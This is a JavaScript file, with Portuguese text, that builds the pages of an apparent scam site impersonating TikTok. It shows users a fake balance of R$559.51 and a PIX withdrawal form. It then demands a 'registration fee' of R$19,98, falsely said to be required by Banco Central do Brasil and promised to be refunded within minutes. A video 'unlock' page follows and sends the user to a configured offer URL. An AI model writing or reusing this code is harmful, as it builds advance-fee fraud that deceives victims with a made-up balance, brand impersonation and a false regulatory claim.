/**
 * pages.js — Navegação e renderização das páginas internas
 *
 * Links configuráveis em js/config.js
 */

// Preserva query string para UTMs
const queryString = window.location.search || '';

// ── SVG do logo TikTok (reutilizado em várias páginas) ──────────────────────
const TIKTOK_LOGO_SVG = `
<svg xmlns="http://www.w3.org/2000/svg" width="102" height="30" viewBox="0 0 102 30" fill="none">
  <path d="M9.49351 21.3496L9.59191 21.6274C9.57631 21.5956 9.54031 21.4984 9.49351 21.3496ZM4.92397 19.3739C5.09676 17.8817 5.68356 17.0459 6.78934 16.1891C8.37152 15.0287 10.3479 15.6851 10.3479 15.6851V11.7905C10.8284 11.7782 11.309 11.8081 11.7843 11.8799V16.8905C11.7843 16.8905 9.80851 16.2341 8.22633 17.3945C7.12114 18.2513 6.53315 19.0877 6.36095 20.5798C6.35555 21.391 6.50135 22.4506 7.17274 23.3668C7.00674 23.278 6.83754 23.1768 6.66515 23.0632C5.18616 22.027 4.91677 20.473 4.92397 19.3739ZM19.9448 4.59063C18.8564 3.34625 18.4448 2.08986 18.296 1.20728H19.6652C19.6652 1.20728 19.3922 3.52145 21.3818 5.79722L21.4094 5.82782C20.8731 5.47589 20.3814 5.06049 19.9448 4.59063Z" fill="#EE1D52"/>
  <path d="M26.5405 8.11923V13.029C26.5405 13.029 24.7933 12.9582 23.5003 12.6144C21.6949 12.1344 20.5346 11.3988 20.5346 11.3988C20.5346 11.3988 19.733 10.8732 19.6682 10.8372V20.9801C19.6682 21.5441 19.52 22.954 19.0682 24.1306C18.4784 25.669 17.5682 26.6788 17.4008 26.8846C17.4008 26.8846 16.2938 28.2502 14.3408 29.1694C12.5805 29.9986 11.0349 29.9776 10.5729 29.9986C10.5729 29.9986 7.90112 30.109 5.49695 28.4782C4.97685 28.1194 4.49153 27.7126 4.04736 27.2632L4.05936 27.2716C6.46413 28.9024 9.1353 28.792 9.1353 28.792C9.5979 28.771 11.1435 28.792 12.9033 27.9628C14.855 27.0436 15.9632 25.678 15.9632 25.678C16.1288 25.4722 17.0432 24.4624 17.6306 22.9234C18.0812 21.7475 18.2306 20.3375 18.2306 19.7729V9.63061C18.2954 9.66721 19.097 10.1928 19.097 10.1928C19.097 10.1928 20.2574 10.9296 22.0627 11.4084C23.3563 11.7516 25.1029 11.823 25.1029 11.823V7.97583C25.7005 8.11563 26.2099 8.15403 26.5405 8.11923Z" fill="#EE1D52"/>
  <path d="M25.1035 7.97568V11.8222C25.1035 11.8222 23.3569 11.7508 22.0633 11.4076C20.2579 10.9276 19.0976 10.1921 19.0976 10.1921C19.0976 10.1921 18.296 9.66646 18.2312 9.62986V19.7703C18.2312 20.3349 18.083 21.7449 17.6312 22.9209C17.0414 24.4599 16.1312 25.4697 15.9638 25.6755C15.9638 25.6755 14.8568 27.041 12.9038 27.9602C11.1441 28.7894 9.59848 28.7684 9.13588 28.7894C9.13588 28.7894 6.46472 28.8998 4.05995 27.269L4.04795 27.2606C3.7942 27.004 3.55522 26.7332 3.33216 26.4495C2.56477 25.4727 2.09437 24.3189 1.97617 23.9895C1.97582 23.9881 1.97582 23.9867 1.97617 23.9853C1.78538 23.4123 1.38578 22.0383 1.44038 20.7069C1.53698 18.3574 2.32897 16.9162 2.53837 16.5544C3.09319 15.5696 3.81468 14.6885 4.67074 13.9504C5.42572 13.3129 6.28189 12.8059 7.20391 12.4504C7.77883 12.2115 8.37791 12.0355 8.99069 11.9254C9.4389 11.8453 9.89266 11.8002 10.3479 11.7904V15.6826C10.3479 15.6826 8.37149 15.0262 6.78931 16.1866C5.68353 17.0434 5.09673 17.8792 4.92394 19.3713C4.91674 20.4705 5.18613 22.0245 6.66392 23.0619C6.83591 23.1759 7.00511 23.2771 7.17151 23.3655C7.42987 23.7144 7.74386 24.0185 8.1009 24.2655C9.54448 25.2189 10.7541 25.2855 12.3008 24.6663C13.3334 24.2577 14.1068 23.3247 14.4734 22.2903C14.6996 21.6447 14.6966 20.9943 14.6966 20.3229V1.20776H18.2966C18.4454 2.09035 18.857 3.34674 19.9454 4.59112C20.382 5.06098 20.8737 5.47638 21.4099 5.82831C21.5683 5.99931 22.3783 6.84409 23.4181 7.36369C23.9545 7.63179 24.52 7.83715 25.1035 7.97568Z" fill="black"/>
</svg>`;

// ── Conteúdo das páginas ────────────────────────────────────────────────────
const pages = {

  // ── PÁGINA DE SAQUE ────────────────────────────────────────────────────────
  withdraw: `
    <div class="withdraw-page">
      <div class="page-header">
        <button class="back-btn" aria-label="Voltar">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </button>
        <h1>Resgatar recompensas</h1>
        <button class="help-btn" aria-label="Ajuda">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
        </button>
      </div>

      <div class="balance-card">
        <div class="balance-title">Seu saldo</div>
        <div class="balance-amount">R$559.51</div>

      </div>

      <div class="last-rewards">Últimas recompensas: R$54.87</div>

      <div class="withdraw-section">
        <h2>Sacar dinheiro</h2>
        <div class="payment-method">
          <span class="bank-icon">🏦</span>
          Transferência bancária /
          <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" alt="PIX" class="pix-icon">
        </div>

        <div class="amount-options">
          <button class="amount-btn">R$1.5</button>
          <button class="amount-btn">R$5</button>
          <button class="amount-btn selected">R$10</button>
          <button class="amount-btn">R$559.51</button>
        </div>

        <div class="pix-input">
          <select class="pix-type">
            <option value="" disabled selected>Selecione o tipo de chave:</option>
            <option value="cpf">CPF</option>
            <option value="email">E-mail</option>
            <option value="phone">Telefone</option>
            <option value="random">Chave Aleatória</option>
          </select>
          <input type="text" placeholder="Digite a sua chave PIX" class="pix-key">
        </div>

        <button class="withdraw-submit-btn">Realizar Saque</button>

        <p class="withdraw-info">
          Para sacar o seu dinheiro, você precisa de um saldo mínimo de R$ 1,50. Os limites de saque para transações individuais e mensais podem variar conforme o país ou a região.
        </p>
      </div>

      <div class="invite-section">
        <div class="invite-period">1 de jan - 31 fev</div>
        <h2>Convide amigos para ganhar até R$2.125</h2>
        <div class="invite-steps">Convidar. Ganhar recompensas. Repetir!</div>
        <div class="reward-circles">
          <div class="reward-circle active"><div class="circle-amount">R$215</div></div>
          <div class="reward-circle"><div class="circle-amount">R$215</div></div>
          <div class="reward-circle"><div class="circle-amount">R$215</div></div>
          <div class="reward-circle"><div class="circle-amount">R$215</div></div>
        </div>
        <button class="invite-btn">CONVIDAR AMIGOS</button>
        <div class="invite-code">
          Código de convite: <span>24995543</span>
          <button class="copy-btn">📋</button>
        </div>
      </div>

      <div class="help-text">
        <h3>Como retirar o dinheiro?</h3>
        <p>Insira sua chave PIX, escolha o valor e clique em 'Sacar' dinheiro.</p>
      </div>

      <div class="terms">
        Ao continuar, você concorda com os <a href="#">Termos e Condições</a> do TikTok.
        Os pagamentos são processados pela PIPO. Consulte <a href="#">Política de Privacidade</a> da PIPO.
      </div>
    </div>
  `,

  // ── PÁGINA DE CADASTRO / TAXA ──────────────────────────────────────────────
  registration: `
    <div class="registration-page">
      <div class="registration-content">
        <div class="security-icon">${TIKTOK_LOGO_SVG}</div>

        <h1>
          <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            <path d="M9 12l2 2 4-4"/>
          </svg>
          Taxa de Cadastro
        </h1>

        <p class="registration-description">
          Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de R$ 19,98 para garantir a autenticidade dos participantes.
        </p>

        <p class="refund-info">
          O dinheiro será totalmente reembolsado entre 1 a 5 minutos junto ao saldo acumulado.
        </p>

        <div class="info-items">
          <div class="info-item">
            <div class="info-icon">⏱️</div>
            <div class="info-text">
              <h3>Taxa obrigatória</h3>
              <p>Obrigatório para realizar o saque dos seus ganhos.</p>
            </div>
          </div>
          <div class="info-item">
            <div class="info-icon">🔄</div>
            <div class="info-text">
              <h3>Valor reembolsável</h3>
              <p>Você recebe os R$ 19,98 de volta após finalizar.</p>
            </div>
          </div>
          <div class="info-item">
            <div class="info-icon">🔒</div>
            <div class="info-text">
              <h3>Garantia de segurança</h3>
              <p>Seu pagamento é seguro e protegido pelo Banco Central do Brasil.</p>
            </div>
          </div>
        </div>

        <button class="withdraw-submit-btn">Realizar Saque</button>
      </div>
    </div>
  `,

  // ── PÁGINA DE VÍDEO ────────────────────────────────────────────────────────
  video: `
    <div class="video-page">
      <div class="video-header-banner">
        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
      </div>

      <div class="video-page-header">
        <div class="logo-container">${TIKTOK_LOGO_SVG}</div>
        <div class="video-balance-display">
          <div class="label">SALDO</div>
          <div class="amount">R$ 559,51</div>
        </div>
      </div>

      <hr class="video-divider">

      <h1 class="video-section-title">DESBLOQUEIO DE SALDO</h1>
      <p class="video-instruction">Veja como liberar seu saque assistindo ao vídeo.</p>

      <div class="video-wrapper">
        <script type="text/javascript">
          var s = document.createElement("script");
          s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
          s.async = true;
          document.head.appendChild(s);
        </script>
        <div id="ifr_6988ee1eba3ea727caf6d0f1_wrapper" style="margin: 0 auto; width: 100%; max-width: 400px;">
          <div style="position: relative; padding: 178.21782178217822% 0 0 0;" id="ifr_6988ee1eba3ea727caf6d0f1_aspect">
            <iframe
              frameborder="0"
              allowfullscreen
              src="about:blank"
              id="ifr_6988ee1eba3ea727caf6d0f1"
              style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
              referrerpolicy="origin"
              onload="this.onload=null, this.src='https://scripts.converteai.net/3b3eb4ba-90e9-476c-bbfc-3ce0d5307141/players/6988ee1eba3ea727caf6d0f1/v4/embed.html' +(location.search||'?') +'&vl=' +encodeURIComponent(location.href)"
            ></iframe>
          </div>
        </div>
      </div>

      <button class="unlock-btn" id="unlock-btn">DESBLOQUEAR AGORA</button>

      <div class="terms-footer">
        <p>Ao participar das atividades de recompensa, você concorda com nossos
          <a href="#">Termos</a> e <a href="#">Condições</a>.
        </p>
      </div>
    </div>
  `
};

// ── Estado de navegação ────────────────────────────────────────────────────
let currentPage = null;

// Inicializa navegação na página principal
function initializePages() {
  const withdrawBtn = document.getElementById('withdraw-btn');
  if (withdrawBtn) {
    withdrawBtn.addEventListener('click', () => {
      // Se o quiz não foi concluído, mostra aviso
      if (currentQuestionIndex < quizQuestions.length) {
        document.getElementById('withdraw-warning-modal').classList.add('active');
      } else {
        showPage('withdraw');
      }
    });
  }

  // Botão fechar do modal de aviso
  const warningClose = document.getElementById('warning-close-btn');
  if (warningClose) {
    warningClose.addEventListener('click', () => {
      document.getElementById('withdraw-warning-modal').classList.remove('active');
    });
  }

  // Fechar clicando fora do modal
  const warningModal = document.getElementById('withdraw-warning-modal');
  if (warningModal) {
    warningModal.addEventListener('click', (e) => {
      if (e.target === warningModal) {
        warningModal.classList.remove('active');
      }
    });
  }
}

// Mostra uma página
function showPage(pageName) {
  const container = document.querySelector('.app-container');

  if (!currentPage) {
    currentPage = container.innerHTML;
  }

  container.innerHTML = pages[pageName];

  if (pageName === 'withdraw')     setupWithdrawPage();
  if (pageName === 'registration') setupRegistrationPage();
  if (pageName === 'video')        setupVideoPage();
}

// ── Setup: página de saque ─────────────────────────────────────────────────
function setupWithdrawPage() {
  document.querySelector('.back-btn').addEventListener('click', () => {
    const container = document.querySelector('.app-container');
    container.innerHTML = currentPage;
    initializePages();
  });

  document.querySelectorAll('.amount-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
      btn.classList.add('selected');
    });
  });

  document.querySelector('.withdraw-submit-btn').addEventListener('click', () => {
    showPage('registration');
  });
}

// ── Setup: página de cadastro ──────────────────────────────────────────────
function setupRegistrationPage() {
  document.querySelector('.withdraw-submit-btn').addEventListener('click', () => {
    showPage('video');
  });
}

// ── Setup: página de vídeo ─────────────────────────────────────────────────
function setupVideoPage() {
  document.getElementById('unlock-btn').addEventListener('click', () => {
    // Usa o link configurado em config.js e preserva UTMs
    const base = CONFIG.OFFER_URL;
    const url  = base + (queryString
      ? (base.includes('?') ? '&' + queryString.slice(1) : queryString)
      : '');
    window.location.href = url;
  });
}
